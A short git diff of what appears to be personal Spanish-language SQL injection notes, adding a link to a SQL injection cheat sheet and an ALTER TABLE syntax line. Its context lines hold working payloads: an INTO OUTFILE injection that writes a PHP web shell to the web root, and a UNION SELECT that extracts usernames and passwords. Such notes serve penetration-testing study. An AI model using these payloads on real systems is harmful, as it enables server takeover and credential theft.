@@ -53,6 +53,8 @@ select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/s
 
 ##unir varios valores en un mismo resultado:
 ' UNION SELECT username || '~' || password FROM users--
+tabla de concatenación según la db:
+https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ################## Modificar una tabla(nombre, campos, agregar o eliminar una columna)
 ALTER TABLE <tabla> ADD <nombre_columna> <tipo_de_valor>;
